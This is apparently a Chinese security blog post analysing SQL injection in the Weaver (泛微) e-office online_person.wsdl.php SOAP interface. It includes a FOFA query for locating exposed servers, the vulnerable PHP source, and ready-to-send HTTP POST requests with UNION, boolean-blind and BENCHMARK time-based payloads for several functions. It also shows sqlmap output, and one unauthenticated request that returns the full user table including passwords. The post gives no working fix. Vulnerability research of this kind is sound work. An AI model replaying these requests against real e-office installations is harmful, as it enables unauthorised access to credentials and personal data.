---
title: "泛微e-office online_person.wsdl.php sql注入漏洞"
source: https://mrxn.net/jswz/eoffice-webservice-json-online_person-online_person-wsdl-sqli.html
asset_dir: assets/泛微e-office-online_person.wsdl.php-sql注入漏洞
---

# 泛微e-office online\_person.wsdl.php sql注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/3/12 08:28
* 752浏览
* [0评论](#comment)
* 4小时阅读

深入探索

sql

远程过程调用

office


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)E-Office是一款标准化的协同 OA 办公软件，泛微协同办公产品系列成员之一,实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。泛微e-office online\_person.wsdl.php 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

商务软件和生产力软件

# 影响版本

e-office <=9.5

# fofa语法

> `app="泛微-EOffice"`

# 漏洞分析

[webservice](#)-json/online\_person/online\_person.wsdl.php

深入探索

数据库

api

Office

```
<?php

function get_UserInfo( $userid, $username, $start, $limit )
{
    $userapi = new user( );
    $user_info = array( );
    $user_info = $userapi->GetUserInforList( $userid, $username, $start, $limit );
    foreach ( $user_info as $index => $val )
    {
        $user_info[$index]['PRIV_NAME'] = ( $val['USER_PRIV']."," );
        $user_info[$index]['PRIV_NAME'] = ( $user_info[$index]['PRIV_NAME'], 0, -1 );
        $user_info[$index]['DEPT_NAME'] = ( $val['DEPT_ID'] );
    }
    return ( $user_info );
}

function getUserAmount( $userid, $username )
{
    $userapi = new user( );
    $user_counts = $userapi->GetSearchUserAmount( $userid, $username );
    return $user_counts;
}

function getOnline( $userid )
{
    $user_online = ( $userid );
    return ( $user_online );
}

function getPrivInfo( $a )
{
    $userapi = new user( );
    $user_privinfo = $userapi->getPrivInfo( $a );
    return ( $user_privinfo );
}

function GetDeptInformation( $a )
{
    $userapi = new user( );
    $user_deptinfo = $userapi->getDeptInfo( $a );
    return ( $user_deptinfo );
}

function getHrInfo( $a )
{
    $userapi = new user( );
    $user_hrinfo = $userapi->getHrInfo( $a );
    return ( $user_hrinfo );
}

function getCreatpic( $imagesource, $picname, $size, $attachmentid )
{
    $creat_pic = ( $imagesource, $picname, $size = "80", $attachmentid = "" );
    return $creat_pic;
}

function GetAllDeptInfo( $DeptId )
{
    $userapi = new user( );
    $AllDeptInfo = $userapi->GetAllDeptInfo( $DeptId );
    return ( $AllDeptInfo );
}

function GetAllDeptUser( $Infor )
{
    $userapi = new user( );
    $AllUser = $userapi->GetAllDeptUser( $Infor );
    return ( $AllUser );
}

function GetUserIdbyUserAccount( $useraccount )
{
    global $connection;
    $query = "SELECT * FROM user WHERE USER_ACCOUNTS='".$useraccount."'";
    $res = ( $connection, $query );
    if ( $row = ( $res ) )
    {
        $USER_ID = $row['USER_ID'];
        return ( $USER_ID );
    }
}

function GetUserPriv( $privname )
{
    global $connection;
    $userapi = new user( );
    $reStr = $userapi->GetAllPrivInfor( $privname );
    return ( $reStr );
}

include_once( "nusoap/lib/nusoap.php" );
include_once( "api/user.class.php" );
include_once( "inc/conn.php" );
include_once( "inc/utility_all.php" );
include_once( "inc/function_picture.php" );
include_once( "inc/checkcurrentsession.php" );
$server = new soap_server( );
$server->soap_defencoding = "UTF-8";
$server->decode_utf8 = false;
$server->configureWSDL( "personServicewsdl", "urn:personServicewsdl" );
$server->wsdl->schemaTargetNamespace = "urn:personServicewsdl";
$server->register( "get_UserInfo", array( "userid" => "xsd:string", "username" => "xsd:string", "start" => "xsd:string", "limit" => "xsd:string" ), array( "return" => "xsd:string" ), "urn:personServicewsdl", "urn:personServicewsdl#get_UserInfo", "rpc", "encoded", "Get E-office online_person count" );
$server->register( "getUserAmount", array( "userid" => "xsd:string", "username" => "xsd:string" ), array( "return" => "xsd:string" ), "urn:personServicewsdl", "urn:personServicewsdl#getUserAmount", "rpc", "encoded", "Get E-office online_person count" );
$server->register( "getOnline", array( "userid" => "xsd:string" ), array( "return" => "xsd:string" ), "urn:personServicewsdl", "urn:personServicewsdl#getOnline", "rpc", "encoded", "Get E-office online_person count" );
$server->register( "getPrivInfo", array( "a" => "xsd:string" ), array( "return" => "xsd:string" ), "urn:personServicewsdl", "urn:personServicewsdl#getPrivInfo", "rpc", "encoded", "Get E-office online_person count" );
$server->register( "GetDeptInformation", array( "a" => "xsd:int" ), array( "return" => "xsd:string" ), "urn:personServicewsdl", "urn:personServicewsdl#GetDeptInformation", "rpc", "encoded", "Get E-office online_person GetDeptInformation" );
$server->register( "getHrInfo", array( "a" => "xsd:string" ), array( "return" => "xsd:string" ), "urn:personServicewsdl", "urn:personServicewsdl#getHrInfo", "rpc", "encoded", "Get E-office online_person count" );
$server->register( "getCreatpic", array( "imagesource" => "xsd:string", "picname" => "xsd:string", "size" => "xsd:string", "attachmentid" => "xsd:string" ), array( "return" => "xsd:string" ), "urn:personServicewsdl", "urn:personServicewsdl#getCreatpic", "rpc", "encoded", "Get E-office online_person count" );
$server->register( "GetAllDeptInfo", array( "DeptId" => "xsd:int" ), array( "return" => "xsd:string" ), "urn:personServicewsdl", "urn:personServicewsdl#GetAllDeptInfo", "rpc", "encoded", "Get E-office online_person Dept" );
$server->wsdl->addComplexType( "SearchCondition", "complexType", "array", "all", "", array(
    "PrivId" => array( "name" => "PrivId", "type" => "xsd:string" ),
    "DeptId" => array( "name" => "DeptId", "type" => "xsd:string" ),
    "Relation" => array( "name" => "Relation", "type" => "xsd:string" ),
    "Search" => array( "name" => "Search", "type" => "xsd:string" )
) );
$server->register( "GetAllDeptUser", array( "Infor" => "tns:SearchCondition" ), array( "return" => "xsd:string" ), "urn:personServicewsdl", "urn:personServicewsdl#GetAllDeptUser", "rpc", "encoded", "Get E-office online_person GetAllDeptUser" );
$server->register( "GetUserIdbyUserAccount", array( "useraccount" => "xsd:string" ), array( "return" => "xsd:string" ), "urn:personServicewsdl", "urn:personServicewsdl#GetUserIdbyUserAccount", "rpc", "encoded", "Get E-office online_person GetUserIdbyUserAccount" );
$server->register( "GetUserPriv", array( "privname" => "xsd:string" ), array( "return" => "xsd:string" ), "urn:personServicewsdl", "urn:personServicewsdl#GetUserPriv", "rpc", "encoded", "Get E-office online_person GetUserPriv" );
$server->service( $HTTP_RAW_POST_DATA );
?>
```

## get\_UserInfo

跟进 `GetUserInforList` 函数

```
public function GetUserInforList( $userid = "", $username = "", $start, $limit )
    {
        global $connection;
        $Infor = array( );
        $limit = 0 < $limit ? $limit : $this->default_limit;
        $start = 0 < $start ? $start : $this->default_start;
        $sql = "SELECT * FROM USER WHERE 1 AND DEPT_ID!='-1'";
        if ( $userid != "" )
        {
            $sql .= " AND USER_ID='".$userid."'";
        }
        if ( $username != "" )
        {
            $sql .= " AND USER_NAME LIKE '%".$username."%'";
        }
        $sql .= " ORDER BY LISTNUMBER ASC LIMIT ".$start.",".$limit."";
        $rs = ( $connection, $sql );
        while ( $row = ( $rs ) )
        {
            $Infor[] = $row;
        }
        return $Infor;
    }
```

`$userid` 、`$username` 均是直接拼接进SQL语句的 where 语句后，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，且同时还存在信息泄露，如果几个参数为空则直接查询 USER 表的所有信息全部返回。

编程

## getUserAmount

```
function getUserAmount( $userid, $username )
{
    $userapi = new user( );
    $user_counts = $userapi->GetSearchUserAmount( $userid, $username );
    return $user_counts;
}
```

跟进 `GetSearchUserAmount` 函数

```
public function GetSearchUserAmount( $userid = "", $username = "" )
    {
        global $connection;
        $sql = "SELECT COUNT(*) AS CNT FROM USER WHERE 1 AND DEPT_ID!='-1'";
        if ( $userid != "" )
        {
            $sql .= " AND USER_ID='".$userid."'";
        }
        if ( $username != "" )
        {
            $sql .= " AND USER_NAME LIKE '%".$username."%'";
        }
        $rs = ( $connection, $sql );
        $row = ( $rs );
        $amount = $row['CNT'];
        return $amount;
    }
```

`$userid` 和 `$username` 均直接拼接进SQL语句中执行，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

## getPrivInfo

```
function getPrivInfo( $a )
{
    $userapi = new user( );
    $user_privinfo = $userapi->getPrivInfo( $a );
    return ( $user_privinfo );
}
```

```
public function getPrivInfo( $userpriv )
    {
        global $connection;
        $arrayd = array( );
        if ( $userpriv != "" )
        {
            $sql = "SELECT * FROM user_priv WHERE USER_PRIV='".$userpriv."'";
            $rs = ( $connection, $sql );
            $row = ( $rs );
            $arrayd['USER_PRIV'] = $row['USER_PRIV'];
            $arrayd['PRIV_NAME'] = $row['PRIV_NAME'];
        }
        return $arrayd;
    }
```

`$userpriv` 也是直接拼接进SQL语句中执行，造成SQL注入漏洞。

代码安全审计

## GetAllDeptInfo

```
function GetAllDeptInfo( $DeptId )
{
    checkcurrentsession( );
    $userapi = new user( );
    $AllDeptInfo = $userapi->GetAllDeptInfo( $DeptId );
    return json_encode( $AllDeptInfo );
}

public function GetAllDeptInfo( $DeptId = "" )
    {
        global $connection;
        $DeptInfo = array( );
        $sql = "SELECT * FROM department WHERE 1";
        if ( $DeptId != "" )
        {
            $sql .= " AND DEPT_ID='".$DeptId."'";
        }
        $rs = exequery( $connection, $sql );
        while ( $row = mysql_fetch_array( $rs ) )
        {
            $info['DEPT_ID'] = $row['DEPT_ID'];
            $info['DEPT_NAME'] = $row['DEPT_NAME'];
            $info['TEL_NO'] = $row['TEL_NO'];
            $info['FAX_NO'] = $row['FAX_NO'];
            $info['DEPT_NO'] = $row['DEPT_NO'];
            $info['DEPT_PARENT'] = $row['DEPT_PARENT'];
            array_push( $DeptInfo, $info );
        }
        return $DeptInfo;
    }
```

`$DeptId` 也是直接拼接进SQL语句中执行，造成SQL注入漏洞。

漏洞修复方案

GetDeptInformation、getOnline、getHrInfo、GetAllDeptUser、GetUserIdbyUserAccount和GetUserPriv 均存在同样的问题。

# 漏洞复现

## get\_UserInfo

### 信息泄露

```
POST /webservice-json/online_person/online_person.wsdl.php HTTP/1.1
User-Agent: Apache-HttpClient/4.5.5 (Java/17.0.12)
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
SOAPAction: urn:personServicewsdl#get_UserInfo
Content-Type: text/xml;charset=UTF-8
Host: eoffice.mrxn.net:8082
Content-Length: 659

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:personServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:get_UserInfo soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <userid xsi:type="xsd:string"></userid>
         <username xsi:type="xsd:string"></username>
         <start xsi:type="xsd:string"></start>
         <limit xsi:type="xsd:string"></limit>
      </urn:get_UserInfo>
   </soapenv:Body>
</soapenv:Envelope>
```

[![泛微e-office online_person.wsdl.php sql注入漏洞](images/img-001-89924a464792.webp)](https://image.mrxn.net/6663f6955f874a5bba6e0e501e64b17f.webp)

直接回显全部 user 表信息包括用户名、密码等敏感信息。

物流软件安全

### sql注入

```
POST /webservice-json/online_person/online_person.wsdl.php HTTP/1.1
User-Agent: Apache-HttpClient/4.5.5 (Java/17.0.12)
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
SOAPAction: urn:personServicewsdl#get_UserInfo
Content-Type: text/xml;charset=UTF-8
Host: eoffice.mrxn.net:8082
Content-Length: 659

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:personServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:get_UserInfo soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <userid xsi:type="xsd:string">' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7176787a71,0x78484e6141584a42617775657574777375444b63586946456f6e5757434a6e4775526476564e766a,0x7176786271),NULL,NULL#</userid>
         <username xsi:type="xsd:string"></username>
         <start xsi:type="xsd:string"></start>
         <limit xsi:type="xsd:string"></limit>
      </urn:get_UserInfo>
   </soapenv:Body>
</soapenv:Envelope>
```

[![泛微e-office online_person.wsdl.php sql注入漏洞](images/img-002-602ad013014c.webp)](https://image.mrxn.net/f0b7fc1b2ecb4b7ebb4d0e545d8090c5.webp)

[sqlmap](https://mrxn.net/tag/sqlmap) 结果如下

网络安全

```
sqlmap identified the following injection point(s) with a total of 2338 HTTP(s) requests:
---
Parameter: SOAP #1* ((custom) POST)
    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:personServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:get_UserInfo soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <userid xsi:type="xsd:string">' AND 3841=BENCHMARK(5000000,MD5(0x73477879))-- ltEz</userid>
         <username xsi:type="xsd:string"></username>
         <start xsi:type="xsd:string"></start>
         <limit xsi:type="xsd:string"></limit>
      </urn:get_UserInfo>
   </soapenv:Body>
</soapenv:Envelope>

    Type: UNION query
    Title: MySQL UNION query (NULL) - 56 columns
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:personServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:get_UserInfo soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <userid xsi:type="xsd:string">' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7176787a71,0x78484e6141584a42617775657574777375444b63586946456f6e5757434a6e4775526476564e766a,0x7176786271),NULL,NULL#</userid>
         <username xsi:type="xsd:string"></username>
         <start xsi:type="xsd:string"></start>
         <limit xsi:type="xsd:string"></limit>
      </urn:get_UserInfo>
   </soapenv:Body>
</soapenv:Envelope>
---
```

## getUserAmount

```
POST /webservice-json/online_person/online_person.wsdl.php HTTP/1.1
User-Agent: Apache-HttpClient/4.5.5 (Java/17.0.12)
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
SOAPAction: urn:personServicewsdl#getUserAmount
Content-Type: text/xml;charset=UTF-8
Host: eoffice.mrxn.net:8082

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:personServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:getUserAmount soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <userid xsi:type="xsd:string">' AND 6446=BENCHMARK(5000000,MD5(0x47767341))-- Wmvy</userid>
         <username xsi:type="xsd:string">1</username>
      </urn:getUserAmount>
   </soapenv:Body>
</soapenv:Envelope>
```

[![泛微e-office online_person.wsdl.php sql注入漏洞](images/img-003-83c2a4b41fd3.webp)](https://image.mrxn.net/39f6344c22ca4333bcc55c6197184901.webp)

通过 **BENCHMARK** 成功延时 5 秒

SQL注入防护

## getPrivInfo

```
POST /webservice-json/online_person/online_person.wsdl.php HTTP/1.1
User-Agent: Apache-HttpClient/4.5.5 (Java/17.0.12)
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
SOAPAction: urn:personServicewsdl#getPrivInfo
Content-Type: text/xml;charset=UTF-8
Host: eoffice.mrxn.net:8082
Content-Length: 448

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:personServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:getPrivInfo soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <a xsi:type="xsd:string">admin' UNION ALL SELECT NULL,CONCAT(0x716a6a7a71,0x704f4151596168504f6a487670526d4b444b42787055415242537256627464774d696e725a755a7a,0x71717a6a71),NULL,NULL,NULL#</a>
      </urn:getPrivInfo>
   </soapenv:Body>
</soapenv:Envelope>
```

通过联合注入，成功回显测试payload

计算机服务器

[![泛微e-office online_person.wsdl.php sql注入漏洞](images/img-004-3487062d0a3d.webp)](https://image.mrxn.net/b500a6eb3488457f91884c27bfcbed96.webp)

sqlmap结果如下

```
sqlmap identified the following injection point(s) with a total of 152 HTTP(s) requests:
---
Parameter: SOAP #1* ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:personServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:getPrivInfo soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <a xsi:type="xsd:string">admin' OR NOT 3132=3132#</a>
      </urn:getPrivInfo>
   </soapenv:Body>
</soapenv:Envelope>

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:personServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:getPrivInfo soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <a xsi:type="xsd:string">admin' AND 3046=BENCHMARK(5000000,MD5(0x5770784d))-- HcbI</a>
      </urn:getPrivInfo>
   </soapenv:Body>
</soapenv:Envelope>

    Type: UNION query
    Title: MySQL UNION query (NULL) - 5 columns
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:personServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:getPrivInfo soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <a xsi:type="xsd:string">admin' UNION ALL SELECT NULL,CONCAT(0x716a6a7a71,0x704f4151596168504f6a487670526d4b444b42787055415242537256627464774d696e725a755a7a,0x71717a6a71),NULL,NULL,NULL#</a>
      </urn:getPrivInfo>
   </soapenv:Body>
</soapenv:Envelope>
---
```

## GetAllDeptInfo

```
POST /webservice-json/online_person/online_person.wsdl.php HTTP/1.1
User-Agent: Apache-HttpClient/4.5.5 (Java/17.0.12)
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
SOAPAction: urn:personServicewsdl#GetAllDeptInfo
Content-Type: text/xml;charset=UTF-8
Host: eoffice.mrxn.net:8082
Content-Length: 455

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:personServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:GetAllDeptInfo soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <DeptId xsi:type="xsd:string">1' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7171716b71,0x494461436b75644f68464e6f716457577971567169786b6254464849624f7651755475586f4b7666,0x716b707a71),NULL,NULL,NULL-- -</DeptId>
      </urn:GetAllDeptInfo>
   </soapenv:Body>
</soapenv:Envelope>
```

[![泛微e-office online_person.wsdl.php sql注入漏洞](images/img-005-088c5af3e1fd.webp)](https://image.mrxn.net/7657833b8606407c816e9ad72748d347.webp)

sqlmap结果如下

商务软件和生产力软件

```
sqlmap identified the following injection point(s) with a total of 56 HTTP(s) requests:
---
Parameter: SOAP #1* ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:personServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:GetAllDeptInfo soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <DeptId xsi:type="xsd:string">1' AND 5920=5920 AND 'TShm'='TShm</DeptId>
      </urn:GetAllDeptInfo>
   </soapenv:Body>
</soapenv:Envelope>

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:personServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:GetAllDeptInfo soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <DeptId xsi:type="xsd:string">1' AND 9627=BENCHMARK(5000000,MD5(0x4e456c44)) AND 'epzC'='epzC</DeptId>
      </urn:GetAllDeptInfo>
   </soapenv:Body>
</soapenv:Envelope>

    Type: UNION query
    Title: Generic UNION query (NULL) - 7 columns
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:personServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:GetAllDeptInfo soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <DeptId xsi:type="xsd:string">1' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7171716b71,0x494461436b75644f68464e6f716457577971567169786b6254464849624f7651755475586f4b7666,0x716b707a71),NULL,NULL,NULL-- -</DeptId>
      </urn:GetAllDeptInfo>
   </soapenv:Body>
</soapenv:Envelope>
---
```

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [4.1.get\_UserInfo](#toc-4-1-)
* [4.2.getUserAmount](#toc-4-2-)
* [4.3.getPrivInfo](#toc-4-3-)
* [4.4.GetAllDeptInfo](#toc-4-4-)
* [5.漏洞复现](#toc-5-)
* [5.1.get\_UserInfo](#toc-5-1-)
* [5.1.1.信息泄露](#toc-5-1-1-)
* [5.1.2.sql注入](#toc-5-1-2-)
* [5.2.getUserAmount](#toc-5-2-)
* [5.3.getPrivInfo](#toc-5-3-)
* [5.4.GetAllDeptInfo](#toc-5-4-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
